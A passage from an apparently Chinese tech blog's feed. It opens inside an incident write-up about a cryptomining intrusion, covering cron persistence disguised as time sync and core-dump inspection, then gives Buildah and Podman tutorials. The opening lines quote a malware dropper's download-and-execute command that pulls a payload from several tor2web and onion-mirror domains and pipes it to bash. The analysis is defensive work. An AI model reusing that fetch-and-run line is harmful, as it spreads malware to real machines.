$t.civiclink.network ||</span><br><span class="line">u $t.onion.mn ||</span><br><span class="line">u $t.onion.sh ||</span><br><span class="line">u $t.onion.in.net ||</span><br><span class="line">u $t.tor2web.io ||</span><br><span class="line">u $t.4tor.ml ||</span><br><span class="line">u $t.onion.to</span><br><span class="line">)|bash</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>我们可以看看这个脚本的内容，先是重定向了标准输出，然后定义了一个函数，函数的作用是 wget/curl 下载一个文件，如果对应 pid 文件不存在，那么执行这个函数，并传递了很多的域名。</p><p>现在问题来了，进程怎么执行的？因为我有两台机器都有问题，我尝试 <code>kill</code> 掉异常进程，发现没有自动重启，那么很有可能是在系统上存在定时任务，通过 <code>crontab -l</code> 查看</p><img src="/2019/10/25/记一次系统被入侵分析过程/i11.png" title="i11"><p>看到了一个 <code>/root/.systemd-ntpdate</code> 同步时间的任务，我想直接忽略了，但是 jiewei 同学让我查看下这个文件，是不是真的仅仅是时间同步，于时就看了下，好嘛，差点被骗</p><img src="/2019/10/25/记一次系统被入侵分析过程/i12.png" title="i12"><p>既然 <code>crontab -l</code> 都已经配置了，那肯定要检查下其他路径下的配置文件，比如 <code>/etc/cron.d</code> <code>/etc/cron.daily</code> 等路径，果然又发现了一个 <code>0systemd-ntpdate</code> </p><img src="/2019/10/25/记一次系统被入侵分析过程/i13.png" title="i13"><img src="/2019/10/25/记一次系统被入侵分析过程/i14.png" title="i14"><p>脚本内容都是一样的，只是 sleep 的参数不同</p><img src="/2019/10/25/记一次系统被入侵分析过程/i15.png" title="i15"><p>既然找到了启动方式，那么现在可以直接 kill 掉进程，并删除 crontab 配置了，fengli 同学想要看看这个进程做了啥，于是通过 <code>gcore</code> 来生成了 core dump 文件</p><img src="/2019/10/25/记一次系统被入侵分析过程/i16.png" title="i16"><p>通过 <code>strings</code> 查看该 coredump 文件，来看看能找到什么有用的信息</p><img src="/2019/10/25/记一次系统被入侵分析过程/i17.png" title="i17"><p>与公网服务器是通过 jsonrpc 发送请求的，但是请求信息被编码过，不知道具体是什么内容</p><img src="/2019/10/25/记一次系统被入侵分析过程/i18.png" title="i18"><p>可以看到大量的 cpu 型号，应该是收集了这个节点的硬件信息</p><img src="/2019/10/25/记一次系统被入侵分析过程/i19.png" title="i19"><p>配置了 SOCK 代理，估计还有访问国外地址的请求</p><img src="/2019/10/25/记一次系统被入侵分析过程/i20.png" title="i20"><p>再就没看出什么了，清理掉相关进程信息，同时清理掉定时任务，收工。</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>但是想着通过 google 查一下连接的那个公网 IP，看看有没有其他受害者，果然，发现了一篇<a href="http://www.ishenping.com/ArtInfo/3753664.html" target="_blank" rel="noopener">博客</a> 也写了一个分析过程，整体分析流程类似。</p><p>同时发现了360 在今年写的一篇<a href="https://blog.netlab.360.com/systemdminer-propagation-through-ddg/" target="_blank" rel="noopener">博客</a> ，里面很详细的分析了这个入侵方式，通过什么方式入侵，有什么特征之类的，推荐阅读。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当你的系统已经被别人入侵过了，那么你不要相信任何你看到的东西。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix</a> </li><li><a href="https://blog.netlab.360.com/systemdminer-propagation-through-ddg/" target="_blank" rel="noopener">https://blog.netlab.360.com/systemdminer-propagation-through-ddg/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;今天早上接到同事报警，环境中两个节点出现了 CPU 使用率告警，通过 &lt;code&gt;top&lt;/code&gt; 查看发现是一个叫 &lt;code&gt;iSd
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Buildah 初次体验</title>
    <link href="https://zdyxry.github.io/2019/10/19/Buildah-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/"/>
    <id>https://zdyxry.github.io/2019/10/19/Buildah-初次体验/</id>
    <published>2019-10-19T02:15:39.000Z</published>
    <updated>2019-10-26T15:00:06.928Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>上周体验了 <a href="https://zdyxry.github.io/2019/10/12/Podman-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/">Podman</a> 来管理容器的构建、生命周期管理等。Podman 自身是可以通过 Dockerfile 来进行容器镜像的构建，并且也支持容器镜像的 pull/push/login 等操作，Buildah 能够带来什么好处，我们为什么要使用它？</p><p>容器工具体验系列：</p><ul><li><a href="https://zdyxry.github.io/2019/10/12/Podman-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/">Podman 初次体验</a></li><li><a href="https://zdyxry.github.io/2019/10/19/Buildah-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/">Buildah 初次体验</a></li><li><a href="https://zdyxry.github.io/2019/10/26/Skopeo-初次体验/">Skopeo 初次体验</a></li></ul><p>注意：本文章所采用环境为 CentOS7，需要除了 Buildah 工具外，还需要安装 <code>containers-common</code> 用于配置容器。</p><h2 id="What"><a href="#What" class="headerlink" title="What"></a>What</h2><p>我们现在使用的容器管理工具无论是 Podman 还是 Docker，都是符合 OCI 规范的，他们操作的镜像也需要符合 OCI 规范，Buildah 介绍很简单： <code>A tool that facilitates building OCI images</code>。</p><p>Buildah 功能列表：</p><ol><li>创建容器</li><li>通过 Dockerfile 或者一个处于运行状态的容器（指 Buildah 自身创建的容器，Podman 不可见</li><li>挂载/卸载镜像文件系统</li><li>使用更新后挂载的镜像文件系统作为文件系统层创建新的镜像</li><li>…</li></ol><h3 id="Buildah-与-Podman-的关系"><a href="#Buildah-与-Podman-的关系" class="headerlink" title="Buildah 与 Podman 的关系"></a>Buildah 与 Podman 的关系</h3><p>在官方说法中，Buildah 与 Podman 是相辅相成的关系，有很多共同点：它们都不需要 root 权限；都可以通过 Dockerfile 来构建容器镜像；都采用 fork-exec 模型；都不需要守护进程等等。 Buildah 主要的优势在于可以在没有 Doclerfiles 的情况下创建容器镜像，这也造成了从 Docker 切换到 Buildah 的用户使用成本会稍微高一些，因为部分概念发生了改变，主要有以下这些对比：</p><table><thead><tr><th>Command</th><th>Podman Behavior</th><th>Buildah Behavior</th></tr></thead><tbody><tr><td>build</td><td>Calls buildah bud</td><td>Provides the build-using-dockerfile (bud) command that emulates Docker’s build command.</td></tr><tr><td>commit</td><td>Commits a Podman container into a container image. Does not work on a Buildah container. Once committed the resulting image can be used by either Podman or Buildah.</td><td>Commits a Buildah container into a container image. Does not work on a Podman container. Once committed, the resulting image can be used by either Buildah or Podman.</td></tr><tr><td>mount</td><td>Mounts a Podman container. Does not work on a Buildah container.</td><td>Mounts a Buildah container. Does not work on a Podman container.</td></tr><tr><td>pull and push</td><td>Pull or push an image from a container image registry. Functionally the same as Buildah.</td><td>Pull or push an image from a container image registry. Functionally the same as Podman.</td></tr><tr><td>run</td><td>Run a process in a new container in the same manner as docker run.</td><td>Runs the container in the same way as the RUN command in a Dockerfile.</td></tr><tr><td>rm</td><td>Removes a Podman container. Does not work on a Buildah container.</td><td>Removes a Buildah container. Does not work on a Podman container.</td><td></td></tr><tr><td>rmi, images, tag</td><td>Equivalent on both projects.</td><td>Equivalent on both projects.</td></tr><tr><td>containers and ps</td><td>ps is used to list Podman containers. The containers command does not exist.</td><td>containers is used to list Buildah containers. The ps command does not exist.</td></tr></tbody></table><h2 id="How"><a href="#How" class="headerlink" title="How"></a>How</h2><h3 id="从-Dockerfile-构建镜像"><a href="#从-Dockerfile-构建镜像" class="headerlink" title="从 Dockerfile 构建镜像"></a>从 Dockerfile 构建镜像</h3><p>buildah 提供了 <code>build-using-dockerfile</code> 命令支持从 Dockerfile 构建镜像，命令等同于 <code>docker build</code> 与 <code>podman build</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ cat Dockerfile  <span class="comment"># 编写 Dockerfile</span></span><br><span class="line">FROM centos</span><br><span class="line"></span><br><span class="line">MAINTAINER &lt;zdyxry@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">CMD <span class="built_in">echo</span> <span class="string">"hello yiran"</span></span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah bud -t yiran . <span class="comment"># 使用 `bud` 命令构建镜像，等同于 `docker build`</span></span><br><span class="line">STEP 1: FROM centos</span><br><span class="line">STEP 2: MAINTAINER &lt;zdyxry@gmail.com&gt;</span><br><span class="line">STEP 3: CMD <span class="built_in">echo</span> <span class="string">"hello yiran"</span></span><br><span class="line">STEP 4: COMMIT yiran</span><br><span class="line">Getting image <span class="built_in">source</span> signatures</span><br><span class="line">Copying blob 9e607bb861a7 skipped: already exists</span><br><span class="line">Copying blob 5f70bf18a086 skipped: already exists</span><br><span class="line">Copying config ebaeed04e2 <span class="keyword">done</span></span><br><span class="line">Writing manifest to image destination</span><br><span class="line">Storing signatures</span><br><span class="line">ebaeed04e23610d304c74d1e3bc0c428162e6e7eac529dce1376d8b284604b85</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah images</span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED              SIZE</span><br><span class="line">localhost/yiran            latest   ebaeed04e236   3 seconds ago        227 MB</span><br><span class="line">docker.io/library/centos   latest   0f3e07c0138f   2 weeks ago          227 MB</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ podman images <span class="comment"># 构建出来的镜像保存在 `/var/lib/containers/storage` ，因此 Podman 可以直接使用</span></span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED              SIZE</span><br><span class="line">localhost/yiran            latest   ebaeed04e236   7 seconds ago        227 MB</span><br><span class="line">docker.io/library/centos   latest   0f3e07c0138f   2 weeks ago          227 MB</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ podman run localhost/yiran:latest</span><br><span class="line">hello yiran</span><br></pre></td></tr></table></figure><h3 id="从容器中构建镜像"><a href="#从容器中构建镜像" class="headerlink" title="从容器中构建镜像"></a>从容器中构建镜像</h3><p>这是 Buildah 最常使用方式，<code>buildah</code> 配合 Host 的命令操作来达到简化镜像构建的目的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah from centos</span><br><span class="line">centos-working-container</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah run centos-working-container yum install httpd -y</span><br><span class="line">Complete!</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ <span class="built_in">echo</span> <span class="string">"Hi yiran"</span> &gt; index.html</span><br><span class="line">You have new mail.</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah copy centos-working-container index.html /var/www/html/index</span><br><span class="line">062e7183713e39f9788fe12ef40c298aa69e394df5ee9699aa6c136fb32f3144</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah config --entrypoint <span class="string">"/usr/sbin/httpd -DFOREGROUND"</span> centos-working-container      </span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah commit centos-working-container  yiran-httpd</span><br><span class="line">Getting image <span class="built_in">source</span> signatures</span><br><span class="line">Copying blob 9e607bb861a7 skipped: already exists</span><br><span class="line">Copying blob a6d6842abbd9 <span class="keyword">done</span></span><br><span class="line">Copying config daa1399f36 <span class="keyword">done</span></span><br><span class="line">Writing manifest to image destination</span><br><span class="line">Storing signatures</span><br><span class="line">bdaa1399f36944ff74e6fe20c5b346aece51f5edb9c47907027ac4d877ccf179c</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah images</span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED          SIZE</span><br><span class="line">localhost/yiran-httpd      latest   daa1399f3694   7 seconds ago    277 MB</span><br><span class="line">localhost/yiran            latest   ebaeed04e236   13 minutes ago   227 MB</span><br><span class="line">&lt;none&gt;                     &lt;none&gt;   975b7fcdfccc   13 minutes ago   227 MB</span><br><span class="line">&lt;none&gt;                     &lt;none&gt;   8cafad8a1ab0   15 minutes ago   227 MB</span><br><span class="line">docker.io/library/centos   latest   0f3e07c0138f   2 weeks ago      227 MB</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ podman images</span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED          SIZE</span><br><span class="line">localhost/yiran-httpd      latest   daa1399f3694   15 seconds ago   277 MB</span><br><span class="line">localhost/yiran            latest   ebaeed04e236   13 minutes ago   227 MB</span><br><span class="line">&lt;none&gt;                     &lt;none&gt;   975b7fcdfccc   13 minutes ago   227 MB</span><br><span class="line">&lt;none&gt;                     &lt;none&gt;   8cafad8a1ab0   15 minutes ago   227 MB</span><br><span class="line">docker.io/library/centos   latest   0f3e07c0138f   2 weeks ago      227 MB</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ podman run -p 8080:80 localhost/yiran-httpd:latest</span><br><span class="line">AH00558: httpd: Could not reliably determine the server<span class="string">'s fully qualified domain name, using 10.88.0.5. Set the '</span>ServerName<span class="string">' directive globally to suppress this message</span></span><br></pre></td></tr></table></figure><p>上述操作解释如下：</p><ol><li><code>buildah from</code> 命令创建一个新的处于运行中的容器</li><li><code>buildah run &lt;container id&gt;</code> 在容器中执行命令</li><li><code>echo yiran &gt; index.html</code> 在主机上执行的命令，生成文件，该文件保存在主机上</li><li><code>buildah copy</code> 将主机上的文件拷贝到容器中，等同于 Dockerfile 中的 <code>COPY</code></li><li><code>buildah config --entrypoint</code> 给容器配置 entrypoint，等同于 Dockerfile 中的 <code>ENTRYPOINT</code></li><li><code>buildah commit</code> 将该容器制作为镜像，保存在 <code>/var/lib/containers/</code> 下</li></ol><h3 id="挂载镜像"><a href="#挂载镜像" class="headerlink" title="挂载镜像"></a>挂载镜像</h3><p>buildah 提供了 <code>buildah mount</code> 命令，可以将运行中容器挂载到 Host 的文件系统上，我们可以直接在 Host 上对容器内文件进行操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah images</span><br><span class="line">REPOSITORY                  TAG      IMAGE ID       CREATED          SIZE</span><br><span class="line">localhost/yiran-httpd       latest   daa1399f3694   25 minutes ago   277 MB</span><br><span class="line">localhost/yiran             latest   ebaeed04e236   39 minutes ago   227 MB</span><br><span class="line">docker.io/library/centos    latest   0f3e07c0138f   2 weeks ago      227 MB</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah from localhost/yiran-httpd</span><br><span class="line">yiran-httpd-working-container</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah mount yiran-httpd-working-container</span><br><span class="line">/var/lib/containers/storage/overlay/75d42aaf05bfb855d59c7ae32ac138acd17c6a40f56cd541b16bffad6c720e9b/merged</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ cat /var/lib/containers/storage/overlay/75d42aaf05bfb855d59c7ae32ac138acd17c6a40f56cd541b16bffad6c720e9b/merged/var/www/html/index</span><br><span class="line">Hi yiran</span><br></pre></td></tr></table></figure><p>我们除了可以直接操作容器内文件，也可以在 Host 上给容器安装一些软件，如 dnf、make 等工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnf install --installroot=&lt;container mountpoint&gt;</span><br><span class="line">make install DESTDIR=&lt;container mountpoint&gt;</span><br></pre></td></tr></table></figure><p>这里面临一个问题：如果在构建镜像的时候依赖于我们 Host 的环境，那么就无法达到我们想要的构建环境隔离了。这个问题可以通过使用多个容器共同构建来解决。</p><p>假设如果我们需要 gcc 环境，那么我们可以准备两个容器：其中一个包含 gcc ，并用它来编译，编译完成后在另一个纯净的容器中安装，最终只需要 commit 纯净的容器就可以。</p><p>这里的好处是 buildah 方式构建镜像，不会像 Dockerfile 一样包含很多层，只有执行 <code>buildah commit</code> 的时候产生一层镜像文件，我们也不需要考虑清理编译环境等问题。</p><h2 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h2><p>了解了基本的使用，那么我们需要知道为什么要使用 Buildah。</p><p>首先如果不使用 Buildah，对于整个容器工具链来说是完全 Ok 的，哪怕是不使用 Docker，仅凭 <code>podman build</code> 命令配合 Dockerfile 也是足够的，我们可以构建我们所需要的任意镜像。</p><p>使用 Buildah 能带来什么好处呢？我理解是我们可以通过更多的手段去构建镜像，不局限于 Dockerfile 中有限的关键字，我们有了更多的可能性，这就足够了。无论是 Buildah 原生命令还是通过 <code>buildah mount</code> 挂载到本地文件系统，都让我们可以更舒服的构建镜像，我们从维护一个 Dockerfile 转变为维护一个 Shell 脚本。</p><p>当然无论使用哪种方式，我们都需要知道 OCI 镜像标准是什么，这是最基本的。</p><p>Shell 脚本示例：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line">set -o errexit</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Create a container</span></span><br><span class="line">container=$(buildah from fedora:28)</span><br><span class="line">mountpoint=$(buildah mount $container)</span><br><span class="line"></span><br><span class="line">buildah config --label maintainer="yiran &lt;zdyxry@gmail.com&gt;" $container</span><br><span class="line"></span><br><span class="line">curl -sSL http://ftpmirror.gnu.org/hello/hello-2.10.tar.gz \</span><br><span class="line">     -o /tmp/hello-2.10.tar.gz</span><br><span class="line">tar xvzf src/hello-2.10.tar.gz -C $&#123;mountpoint&#125;/opt</span><br><span class="line"></span><br><span class="line">pushd $&#123;mountpoint&#125;/opt/hello-2.10</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install DESTDIR=$&#123;mountpoint&#125;</span><br><span class="line">popd</span><br><span class="line"></span><br><span class="line">chroot $mountpoint bash -c "/usr/local/bin/hello -v"</span><br><span class="line"></span><br><span class="line">buildah config --entrypoint "/usr/local/bin/hello" $container</span><br><span class="line">buildah commit --format docker $container hello</span><br><span class="line">buildah unmount $container</span><br></pre></td></tr></table></figure></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/containers/buildah" target="_blank" rel="noopener">https://github.com/containers/buildah</a></li><li><a href="http://chris.collins.is/2017/08/17/buildah-a-new-way-to-build-container-images/" target="_blank" rel="noopener">http://chris.collins.is/2017/08/17/buildah-a-new-way-to-build-container-images/</a> </li><li><a href="https://developers.redhat.com/blog/2019/02/21/podman-and-buildah-for-docker-users/" target="_blank" rel="noopener">https://developers.redhat.com/blog/2019/02/21/podman-and-buildah-for-docker-users/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;上周体验了 &lt;a href=&quot;https://zdyxry.github.io/2019/10/12/Podman-%E5%88%9D%E6
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://zdyxry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Podman 初次体验</title>
    <link href="https://zdyxry.github.io/2019/10/12/Podman-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/"/>
    <id>https://zdyxry.github.io/2019/10/12/Podman-初次体验/</id>
    <published>2019-10-12T13:40:30.000Z</published>
    <updated>2019-10-26T14:59:58.352Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>CentOS8 在9月24号正式 Release 了，比 RHEL8 要推迟了4个月。这次的更新感觉比 CentOS7 的更新要来的重要，内核更新到了4.x，网络管理彻底替换了 network.service，防火墙管理等等，还包括去除了 Docker 作为默认的容器化管理工具，使用 Podman、Buildah、Skopeo 进行了替换，这里来体验下 Podman。</p><p>容器工具体验系列：</p><ul><li><a href="https://zdyxry.github.io/2019/10/12/Podman-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/">Podman 初次体验</a></li><li><a href="https://zdyxry.github.io/2019/10/19/Buildah-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/">Buildah 初次体验</a></li><li><a href="https://zdyxry.github.io/2019/10/26/Skopeo-初次体验/">Skopeo 初次体验</a></li></ul><p>本篇文章所有环境基于 CentOS8。</p><h2 id="Podman"><a href="#Podman" class="headerlink" title="Podman"></a>Podman</h2><p>为啥不用 Docker 了？我个人觉得 Docker 目前使用上最大的问题就是需要运行一个守护进程，虽然需要 root 用户也是一个问题，但是对于我个人来说还好。随着 K8S 定义 CRI 标准，且 Docker 的稳定性一直是个问题（虽然最近有在往好的趋势发展），但越来越多人使用 CRI-O 来替代 Docker，Docker 在被大家所抛弃（- - </p><p>Podman 创建的容器不需要守护进程，且可以用普通用户创建容器。Podman 中的大部分命令的使用方式与 Docker 相同，可以看左 <code>alias docker=podman</code> 。</p><p>Podman 的缺点：</p><ol><li>仅在 Linux 下支持，无法像 Docker 一样支持 Windows 和 MacOS</li><li>缺少 docker-compose 工具替代品，哪怕有 k8s Pod 概念（虽然有 <a href="https://github.com/containers/podman-compose" target="_blank" rel="noopener">podman-compose</a>，但是他还没有release 1.0版本，使用需谨慎</li><li>更新频繁（使用这类工具是有些心累的。。</li></ol><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Podman 可以直接使用 <code>dnf</code> 继续安装，需要注意的是，在 CentOS 中 Podman 依赖于 containers-common，这里会附带很多配置信息到 <code>/etc/containers</code>，后续会用到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo dnf install podman                      </span><br><span class="line">Last metadata expiration check: 0:03:31 ago on Wed 02 Oct 2019 11:57:25 AM CST.</span><br><span class="line">Package podman-1.0.0-2.git921f98f.module_el8.0.0+58+91b614e7.x86_64 is already installed.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">Nothing to <span class="keyword">do</span>.</span><br><span class="line">Complete!</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ dnf info podman        </span><br><span class="line">Installed Packages</span><br><span class="line">Name         : podman</span><br><span class="line">Version      : 1.0.0</span><br><span class="line">Release      : 2.git921f98f.module_el8.0.0+58+91b614e7</span><br><span class="line">Arch         : x86_64</span><br><span class="line">Size         : 37 M</span><br><span class="line">Source       : podman-1.0.0-2.git921f98f.module_el8.0.0+58+91b614e7.src.rpm</span><br><span class="line">Repo         : @System</span><br><span class="line">From repo    : AppStream</span><br><span class="line">Summary      : Manage Pods, Containers and Container Images</span><br><span class="line">URL          : https://github.com/containers/libpod</span><br><span class="line">License      : ASL 2.0</span><br><span class="line">Description  : Manage Pods, Containers and Container Images</span><br><span class="line">             : libpod provides a library <span class="keyword">for</span> applications looking to use</span><br><span class="line">             : the Container Pod concept popularized by Kubernetes.</span><br></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>安装完成后，来看下 Podman RPM 中附带了些什么文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ rpm -ql podman  |grep -v <span class="string">'/usr/share/man/'</span>  <span class="comment"># 去除 man 手册中内容</span></span><br><span class="line">/etc/cni/net.d/87-podman-bridge.conflist</span><br><span class="line">/usr/bin/podman</span><br><span class="line">/usr/lib/.build-id</span><br><span class="line">/usr/lib/.build-id/37</span><br><span class="line">/usr/lib/.build-id/37/e7f04d352e5dbde603e9701baedb0b1be6bc37</span><br><span class="line">/usr/lib/.build-id/9a</span><br><span class="line">/usr/lib/.build-id/9a/2b43332ca5756f9e2a086bae9b953009ef5a37</span><br><span class="line">/usr/lib/systemd/system/io.podman.service</span><br><span class="line">/usr/lib/systemd/system/io.podman.socket</span><br><span class="line">/usr/lib/tmpfiles.d/podman.conf</span><br><span class="line">/usr/libexec/podman/conmon</span><br><span class="line">/usr/share/bash-completion/completions/podman</span><br><span class="line">/usr/share/containers/libpod.conf</span><br><span class="line">/usr/share/licenses/podman</span><br><span class="line">/usr/share/licenses/podman/LICENSE</span><br></pre></td></tr></table></figure><p>可以看到只有一个配置文件是在 <code>/etc/cni</code> 路径下的，与 Bridge 的配置有关：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ cat /etc/cni/net.d/87-podman-bridge.conflist</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"cniVersion"</span>: <span class="string">"0.3.0"</span>,</span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"podman"</span>,</span><br><span class="line">    <span class="string">"plugins"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">"type"</span>: <span 